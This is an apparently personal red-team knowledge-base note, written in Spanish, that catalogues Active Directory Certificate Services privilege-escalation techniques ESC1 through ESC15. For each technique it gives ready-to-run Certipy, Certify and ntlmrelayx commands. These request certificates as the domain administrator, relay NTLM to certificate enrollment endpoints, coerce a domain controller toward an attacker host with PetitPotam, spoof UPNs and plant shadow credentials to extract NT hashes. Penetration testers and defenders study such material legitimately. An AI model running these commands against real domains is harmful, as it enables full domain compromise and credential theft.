---
aliases:
  - Active Directory Certificate Services Abuse
  - ADCS Abuse
  - Certipy
  - ESC1-ESC15
tags:
  - type/technique
  - technique/privilege-escalation
  - technique/credential-access
  - env/windows
  - asset/active-directory
  - service/ad-cs
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación]]"
tertiary categories:
  - "[[Active Directory]]"
kind: Technique
linked:
  - "[[Active Directory Explotación]]"
  - "[[Windows Privilege Escalation]]"
  - "[[Certipy]]"
  - "[[Shadow Credentials]]"
  - "[[NTLM Relay]]"
---
# AD CS Abuse

***

## Cheatsheet
^adcs-abuse

| ESC | Misconfig | Impacto | Tool |
| --- | --- | --- | --- |
| **ESC1** | SAN + Client Auth + enroll right | Cert como cualquier user | `certipy req` |
| **ESC2** | Any Purpose EKU + enroll | Cert arbitrario | `certipy req` |
| **ESC3** | Enrollment Agent + enroll on behalf | Cert como cualquier user | `certipy req -on-behalf-of` |
| **ESC4** | WriteProperty sobre template | Convertir template en ESC1 | `certipy template` |
| **ESC5** | Control sobre CA / PKI object | Full ADCS compromise | Varios |
| **ESC6** | `EDITF_ATTRIBUTESUBJECTALTNAME2` en CA | SAN injection en request | `certipy req -upn` |
| **ESC7** | `ManageCA` / `ManageCertificates` | Aprobar request pendiente | `certipy ca` |
| **ESC8** | HTTP enrollment sin signing | Relay NTLM → cert DA | `ntlmrelayx --adcs` |
| **ESC9** | `no-security-extension` flag | Cert de otro user con UPN | `certipy req -upn target@...` |
| **ESC10** | `StrongCertificateBindingEnforcement=0` | Cert con UPN de otro user | Como ESC9 |
| **ESC11** | IF_ENFORCEENCRYPTICERTREQUEST off en RPC | Relay a RPC CA endpoint | `ntlmrelayx -icpr` |
| **ESC13** | Cert policy mapping → AD group | Cert user → membership elevada | `certipy req` |
| **ESC14** | WeakExplicitMapping / altSecurityIdentities | Editar mapping → cert arbitrario | `certipy` |
| **ESC15** | v1 template + Client Auth | Inyección SAN en template v1 | `certipy req -application-policies` |

***

## Descubrimiento

### Certipy (Linux)
```bash
# Enum vulnerable templates + CAs
certipy find -u user@dom.local -p pass -dc-ip DC -vulnerable -stdout

# Zip + json output
certipy find -u user@dom.local -p pass -dc-ip DC -vulnerable -enabled

# Con hash
certipy find -u user -hashes :NTHASH -dc-ip DC -vulnerable

# Con ticket
certipy find -u user -k -no-pass -target DC.dom.local -dc-ip DC
```

### Certify (Windows)
```powershell
.\Certify.exe find /vulnerable
.\Certify.exe find /vulnerable /currentuser
```

### PSPKIAudit
```powershell
Invoke-PKIAudit
```

## ESC1 — SAN + Client Auth + enroll right

Template permite:
- Client Authentication EKU.
- Subject Alternative Name (SAN) especificado por requestor.
- Low-priv user enroll permitido.

### Explotación
```bash
# Request cert como Administrator
certipy req -u user@dom.local -p pass -ca CA-NAME -template VulnTemplate -upn administrator@dom.local -dc-ip DC

# Resultado: administrator.pfx
# Autenticarse
certipy auth -pfx administrator.pfx -dc-ip DC
# → NT hash de administrator
```

## ESC2 — Any Purpose EKU

Template con `Any Purpose` (OID 2.5.29.37.0) o sin EKU → cert para todo.

```bash
certipy req -u user@dom.local -p pass -ca CA -template AnyPurposeTemplate
# Usar para client auth, code signing, etc.
```

## ESC3 — Enrollment Agent

Cert con EKU `Certificate Request Agent` permite solicitar certs on-behalf.

```bash
# 1. Obtener cert agent
certipy req -u user -p pass -ca CA -template EnrollmentAgentTemplate

# 2. Usar para request on-behalf-of
certipy req -u user -p pass -ca CA -template User -on-behalf-of 'dom\administrator' -pfx agent.pfx
```

## ESC4 — WriteProperty sobre template

Control sobre template → reconfigurar para cumplir ESC1.

```bash
# Salvar config original
certipy template -u user -p pass -template VulnTemplate -save-old

# Modificar a ESC1-like
certipy template -u user -p pass -template VulnTemplate -dc-ip DC

# Explotar ESC1
certipy req -u user -p pass -ca CA -template VulnTemplate -upn administrator@dom.local

# Restaurar
certipy template -u user -p pass -template VulnTemplate -configuration VulnTemplate.json
```

## ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2

CA permite SAN en request sobre **cualquier template** (flag deprecated pero aún visto).

```bash
certipy req -u user -p pass -ca CA -template User -upn administrator@dom.local
```

## ESC7 — ManageCA / ManageCertificates

```bash
# Aprobar request previamente denegado
certipy ca -u user -p pass -ca CA -issue-request REQUEST_ID

# Agregar officer right y template SubCA
certipy ca -u user -p pass -ca CA -add-officer user
certipy ca -u user -p pass -ca CA -enable-template SubCA
```

## ESC8 — HTTP Web Enrollment + NTLM Relay

Web enrollment endpoint (`/certsrv/`) sin HTTPS/EPA → relay NTLM.

```bash
# Coercion + relay
ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# En otra terminal
PetitPotam.py -u '' -p '' ATTACKER_IP DC
# o
coercer coerce -t DC -l ATTACKER -u '' -p ''
```

Resultado: cert del DC (si template `DomainController`). Usar con S4U para impersonar DA:

```bash
certipy auth -pfx dc.pfx -dc-ip DC
# → hash de la cuenta DC$, usable para DCSync via S4U
```

## ESC9 / ESC10 — UPN spoofing

Certs no validan `objectSID` (fix: `StrongCertificateBindingEnforcement` KB5014754).

```bash
# Cambiar UPN de user con WriteProperty
certipy account update -u attacker -p pass -user victim -upn administrator

# Request cert (aparece como administrator)
certipy req -u victim -p vpass -ca CA -template Template

# Auth → hash de administrator
certipy auth -pfx victim.pfx -dc-ip DC
```

## ESC11 — RPC enrollment sin signing

```bash
ntlmrelayx.py -t rpc://CA -rpc-mode ICPR -icpr-ca-name CA -smb2support
```

## ESC13 — Policy OID → AD group

Cert con OID mapeado a grupo privilegiado (via `msDS-OIDToGroupLink`).

```bash
certipy req -u user -p pass -ca CA -template ESC13Template
# Cert resultante → membership efectivo del grupo linkeado
```

## ESC15 — v1 template + Client Auth (CVE-2024-49019 EKUwu)

Templates v1 con Client Auth EKU permiten inyección de application policies.

```bash
certipy req -u user -p pass -ca CA -template WebServer -upn administrator@dom.local -application-policies 'Client Authentication'
```

***

## Cadena Shadow Credentials + ADCS

Con `GenericWrite` sobre computer account:

```bash
# Shadow cred (setear msDS-KeyCredentialLink)
certipy shadow auto -u attacker -p pass -account TARGET$ -dc-ip DC

# Auth como computer
certipy auth -pfx TARGET.pfx -dc-ip DC
# → TGT + NT hash de TARGET$
```

## Tools

- **Certipy** (`ly4k/Certipy`) — swiss-army Linux.
- **Certify** (`GhostPack/Certify`) — on-host Windows enum + request.
- **PSPKIAudit** — audit defensivo/ofensivo.
- **ntlmrelayx.py** con `--adcs` — ESC8/ESC11.

## Recursos

- [SpecterOps - Certified Pre-Owned](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf) — paper original.
- [Certipy Wiki](https://github.com/ly4k/Certipy)
- [HackTricks - ADCS](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates)
- [The Hacker Recipes - ADCS](https://www.thehacker.recipes/ad/movement/ad-cs)

***
